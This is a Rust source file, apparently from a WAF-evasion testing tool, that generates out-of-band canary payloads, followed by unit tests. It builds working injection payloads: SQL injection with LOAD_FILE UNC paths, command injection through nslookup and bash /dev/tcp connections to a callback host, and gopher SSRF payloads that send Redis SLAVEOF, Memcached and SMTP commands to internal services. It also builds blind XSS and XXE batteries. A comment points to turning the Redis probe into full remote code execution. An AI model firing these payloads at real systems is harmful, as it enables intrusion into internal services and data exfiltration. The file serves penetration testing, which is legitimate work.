use wafrift_types::oob::OobCanary;

pub fn embed_canary(payload: &str, canary: &OobCanary, payload_type: &str) -> String {
    match payload_type {
        "Sql" => format!(
            "{} LOAD_FILE('\\\\\\\\{}\\\\a')",
            payload, canary.expected_dns
        ),
        "CommandInjection" => format!("{}; nslookup {}", payload, canary.expected_dns),
        "Ssrf" => format!(
            "http://{}/{}",
            canary.expected_dns, canary.expected_http_path
        ),
        "Xss" => format!(
            "<img src=\"//{}/{}\">",
            canary.expected_dns, canary.expected_http_path
        ),
        _ => payload.to_string(),
    }
}

// ─── Battery helpers (interactsh-provider feature) ─────────────────────────
//
// `embed_canary` returns one template per payload type — what wafrift
// has always done. That's fine when the caller wants a single
// emission-per-canary, but a single template loses against any sink
// that filters that one template's tag/separator/protocol. The new
// `embed_*_battery` helpers fan a single canary across the full
// [`interactsh::payload_helpers`] battery so a "blocked by one
// rule" failure doesn't shadow the whole class.
//
// Behind the `interactsh-provider` feature because the helpers come
// from the interactsh crate; consumers that already feature-gate the
// real OOB provider get the batteries for free.

/// Battery of blind XSS payloads embedding `canary`'s HTTP callback.
///
/// Returns the same 9-variant battery [`interactsh::blind_xss_payloads`]
/// produces, with the callback URL built from the canary's DNS host
/// and expected HTTP path.
#[cfg(feature = "interactsh-provider")]
#[must_use]
pub fn embed_blind_xss_battery(canary: &OobCanary) -> Vec<String> {
    let callback_url = canary_http_url(canary);
    interactsh::blind_xss_payloads(&callback_url)
}

/// Battery of blind SSRF payload variants pointing at `canary`'s HTTP URL.
///
/// Combines upstream `interactsh::blind_ssrf_payloads` (http/json/url/
/// redirect/next param/file/dict/single-scheme-gopher) with
/// wafrift-owned Gopherus-style RESP payloads for Redis / Memcached /
/// SMTP that turn an `http://` SSRF into actual RCE confirmation when
/// the target's outbound fetcher allows the scheme.
#[cfg(feature = "interactsh-provider")]
#[must_use]
pub fn embed_blind_ssrf_battery(canary: &OobCanary) -> Vec<String> {
    let callback_url = canary_http_url(canary);
    let mut out = interactsh::blind_ssrf_payloads(&callback_url);
    out.extend(gopher_internal_targets(&canary.expected_dns));
    out
}

/// Gopher payloads targeting common INTERNAL services that an SSRF
/// fetcher may reach (Redis 6379, Memcached 11211, SMTP 25, Dict
/// 11211). These ride RFC 1436 gopher's `_` selector which curl
/// translates to a raw TCP write — `gopher://host:port/_PAYLOAD` is
/// effectively `printf 'PAYLOAD' | nc host port`.
///
/// `canary_dns` is included as the attacker-controlled callback the
/// internal service is told to contact (Redis `SLAVEOF`, SMTP RCPT
/// TO, …) so a successful interaction lands in interactsh's poll
/// loop and confirms the SSRF reached the chosen internal port.
///
/// Reference: Gopherus (github.com/tarunkant/Gopherus) for the RESP
/// templates this list draws from; the specific encoding details are
/// reproduced rather than imported because Gopherus is a Python
/// runtime and we want zero new deps.
#[cfg(feature = "interactsh-provider")]
fn gopher_internal_targets(canary_dns: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    // Redis (port 6379) — RESP-encoded INFO probe; the response, when
    // it reaches the fetcher, confirms the port is reachable. INFO is
    // chosen over a destructive command (no SET / FLUSHALL) so the
    // bench cannot corrupt a production Redis it accidentally hits.
    out.push(format!(
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A"
    ));
    // Redis SLAVEOF — confirms RCE-class access without modifying
    // keys. The target Redis tries to replicate from our canary on
    // port 6379; the TCP connect-attempt is logged at our canary's
    // host even though no Redis listens there. This is the highest-
    // signal probe: if it fires, the SSRF can become full Redis RCE
    // via the classic cron / module-load chain.
    out.push(format!(
        "gopher://127.0.0.1:6379/_%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%24{dns_len}%0D%0A{dns}%0D%0A%244%0D%0A6379%0D%0A",
        dns_len = canary_dns.len(),
        dns = canary_dns,
    ));
    // Memcached (port 11211) — `stats` text-protocol probe; same
    // safety reasoning as Redis INFO. Memcached responds with version
    // info that a curl-class fetcher will surface in the response.
    out.push(format!("gopher://127.0.0.1:11211/_stats%0D%0A"));
    // SMTP (port 25 / 587) — HELO / MAIL FROM / RCPT TO chain with
    // the canary as the recipient. If the internal SMTP relay accepts
    // it, an actual email is sent to our canary's MX and interactsh
    // surfaces the SMTP interaction (now that the SMTP arm in
    // interactsh_provider.rs no longer drops it).
    out.push(format!(
        "gopher://127.0.0.1:25/_HELO%20wafrift%0D%0AMAIL%20FROM%3A%3Cprobe%40wafrift.local%3E%0D%0ARCPT%20TO%3A%3Cprobe%40{dns}%3E%0D%0ADATA%0D%0Aprobe%0D%0A.%0D%0AQUIT%0D%0A",
        dns = canary_dns,
    ));
    // Dict fingerprinting — `INFO` against Redis or `version` against
    // Memcached. Lightweight oracle for "is the SSRF reaching internal
    // services" without sending any state-changing bytes.
    out.push(format!("dict://127.0.0.1:6379/INFO"));
    out.push(format!("dict://127.0.0.1:11211/stats"));
    out
}

/// Battery of blind SQLi payload variants for `dialect` that exfiltrate
/// to `canary`'s DNS host.
///
/// For MySQL / MSSQL the helper passes the bare DNS host (UNC / SMB
/// templates need just the host). For Postgres / Oracle it passes the
/// full HTTP callback URL (their templates use `curl URL` or
/// `UTL_HTTP.request(URL)`).
#[cfg(feature = "interactsh-provider")]
#[must_use]
pub fn embed_blind_sqli_battery(
    canary: &OobCanary,
    dialect: interactsh::SqliDialect,
) -> Vec<String> {
    let callback = match dialect {
        interactsh::SqliDialect::MySql | interactsh::SqliDialect::MsSql => {
            canary.expected_dns.clone()
        }
        interactsh::SqliDialect::Postgres | interactsh::SqliDialect::Oracle => {
            canary_http_url(canary)
        }
        // SqliDialect is `#[non_exhaustive]` to absorb future
        // dialects (SQLite, ClickHouse, …) without forcing
        // consumers to recompile. Default new variants to the
        // full HTTP URL form — that is what every dialect added
        // since UTL_HTTP has settled on.
        _ => canary_http_url(canary),
    };
    interactsh::blind_sqli_payloads(&callback, dialect)
}

/// Battery of blind command-injection payload variants targeting
/// `canary`'s DNS host (DNS lookups and HTTP GETs).
///
/// Upstream `interactsh::blind_cmdi_payloads` covers nslookup / dig /
/// curl / wget / short-ping / PowerShell with five separator variants.
/// wafrift adds two protocol-orthogonal channels on top:
///
/// - `/dev/tcp/host/port` — bash's built-in TCP socket that needs no
///   external binary (curl/wget/nc/nslookup may all be filtered or
///   missing inside a minimal container; bash itself opens the socket).
///   The HTTP collector listens on the canary's port, so a TCP connect
///   alone — no HTTP request needed — surfaces the interaction.
///
/// - long-ping timing channel — `ping -c 10` produces a deterministic
///   9-second delay even when the WAF strips DNS-callback bytes from
///   the response and the egress firewall blocks every outbound
///   protocol. Latency delta vs a calibration request becomes the
///   oracle. The existing `; ping -c 1 host` upstream variant tests
///   reachability, not timing; this variant tests timing.
#[cfg(feature = "interactsh-provider")]
#[must_use]
pub fn embed_blind_cmdi_battery(canary: &OobCanary) -> Vec<String> {
    let mut out = interactsh::blind_cmdi_payloads(&canary.expected_dns);
    let dns = &canary.expected_dns;
    // bash /dev/tcp — connect-only confirmation, three separator
    // variants so a filter rejecting `;` still gets caught by `&&`
    // or `|`. The `cat` write is harmless (the canary's TCP listener
    // accepts and discards bytes); the connect itself is the signal.
    out.push(format!("; bash -c 'cat </dev/tcp/{dns}/80' 2>/dev/null"));
    out.push(format!("&& bash -c 'echo probe >/dev/tcp/{dns}/80' 2>/dev/null"));
    out.push(format!("| bash -c ':>/dev/tcp/{dns}/80' 2>/dev/null"));
    // Long-ping timing channel — pad count so the delay is
    // unmistakable against typical 200 ms request latency. -c 10 on
    // a 1-second-interval ping gives ~9 s of delay.
    out.push(format!("; ping -c 10 127.0.0.1"));
    out.push(format!("&& ping -n 10 127.0.0.1"));
    out.into_iter().collect::<std::collections::BTreeSet<_>>().into_iter().collect()
}

/// Battery of blind XXE payload variants exfiltrating to `canary`'s HTTP URL.
#[cfg(feature = "interactsh-provider")]
#[must_use]
pub fn embed_blind_xxe_battery(canary: &OobCanary) -> Vec<String> {
    let callback_url = canary_http_url(canary);
    interactsh::blind_xxe_payloads(&callback_url)
}

/// Compose the canary's HTTP callback URL from its DNS host and
/// expected HTTP path.
#[cfg(feature = "interactsh-provider")]
fn canary_http_url(canary: &OobCanary) -> String {
    let path = if canary.expected_http_path.starts_with('/') {
        canary.expected_http_path.clone()
    } else {
        format!("/{}", canary.expected_http_path)
    };
    format!("http://{}{}", canary.expected_dns, path)
}

#[cfg(all(test, feature = "interactsh-provider"))]
mod battery_tests {
    use super::*;
    use uuid::Uuid;

    fn make_canary() -> OobCanary {
        OobCanary {
            id: Uuid::new_v4(),
            expected_dns: "abc123.oast.fun".into(),
            expected_http_path: "/wafrift-oob/abc123".into(),
            created_at: None,
        }
    }

    #[test]
    fn xss_battery_carries_canary_url_in_every_variant() {
        let canary = make_canary();
        let battery = embed_blind_xss_battery(&canary);
        let expected = format!(
            "http://{}{}",
            canary.expected_dns, canary.expected_http_path
        );
        for (i, v) in battery.iter().enumerate() {
            assert!(
                v.contains(&expected),
                "battery[{i}] missing url: {v}"
            );
        }
        assert!(battery.len() >= 8, "xss battery too small");
    }

    #[test]
    fn ssrf_battery_includes_scheme_pivots() {
        let canary = make_canary();
        let battery = embed_blind_ssrf_battery(&canary);
        assert!(battery.iter().any(|s| s.starts_with("gopher://")));
        assert!(battery.iter().any(|s| s.starts_with("dict://")));
        assert!(battery.iter().any(|s| s.starts_with("file://")));
    }

    #[test]
    fn sqli_mysql_battery_uses_dns_for_unc() {
        let canary = make_canary();
        let battery =
            embed_blind_sqli_battery(&canary, interactsh::SqliDialect::MySql);
        for v in &battery {
            assert!(
                v.contains(&canary.expected_dns),
                "MySQL variant missing DNS: {v}"
            );
            assert!(!v.contains(&canary.expected_http_path),
                "MySQL UNC variant should NOT carry HTTP path: {v}");
        }
    }

    #[test]
    fn sqli_postgres_battery_uses_full_http_url() {
        let canary = make_canary();
        let battery =
            embed_blind_sqli_battery(&canary, interactsh::SqliDialect::Postgres);
        for v in &battery {
            assert!(
                v.contains(&format!("http://{}", canary.expected_dns)),
                "Postgres variant missing http URL: {v}"
            );
        }
    }

    #[test]
    fn cmdi_battery_every_variant_is_dns_or_timing_or_tcp() {
        let canary = make_canary();
        let battery = embed_blind_cmdi_battery(&canary);
        // Each variant must carry one of: the canary DNS (exfil),
        // a localhost ping (timing channel — no DNS needed by design),
        // or a /dev/tcp socket reference (bash builtin TCP).
        for v in &battery {
            let has_dns = v.contains(&canary.expected_dns);
            let has_timing = v.contains("ping ") && v.contains("127.0.0.1");
            let has_dev_tcp = v.contains("/dev/tcp/");
            assert!(
                has_dns || has_timing || has_dev_tcp,
                "cmdi variant matches none of (dns, ping-timing, /dev/tcp): {v}"
            );
        }
    }

    #[test]
    fn cmdi_battery_includes_timing_and_tcp_variants() {
        let canary = make_canary();
        let battery = embed_blind_cmdi_battery(&canary);
        assert!(
            battery.iter().any(|s| s.contains("/dev/tcp/")),
            "cmdi battery missing /dev/tcp bash-builtin variant"
        );
        assert!(
            battery.iter().any(|s| s.contains("ping -c 10")),
            "cmdi battery missing long-ping timing channel"
        );
    }

    #[test]
    fn ssrf_battery_includes_internal_gopher_targets() {
        let canary = make_canary();
        let battery = embed_blind_ssrf_battery(&canary);
        assert!(
            battery.iter().any(|s| s.contains("127.0.0.1:6379")),
            "ssrf battery missing Redis (6379) gopher probe"
        );
        assert!(
            battery.iter().any(|s| s.contains("127.0.0.1:11211")),
            "ssrf battery missing Memcached (11211) gopher probe"
        );
        assert!(
            battery.iter().any(|s| s.contains("127.0.0.1:25")),
            "ssrf battery missing SMTP (25) gopher probe"
        );
    }

    #[test]
    fn xxe_battery_includes_param_entity_chain() {
        let canary = make_canary();
        let battery = embed_blind_xxe_battery(&canary);
        assert!(battery.iter().any(|s| s.contains("<!ENTITY %")));
        assert!(battery.iter().any(|s| s.contains("<svg")));
    }

    #[test]
    fn canary_http_url_normalises_missing_slash() {
        let mut canary = make_canary();
        canary.expected_http_path = "wafrift-oob/abc123".to_string(); // no leading /
        let url = canary_http_url(&canary);
        assert_eq!(url, "http://abc123.oast.fun/wafrift-oob/abc123");
    }
}
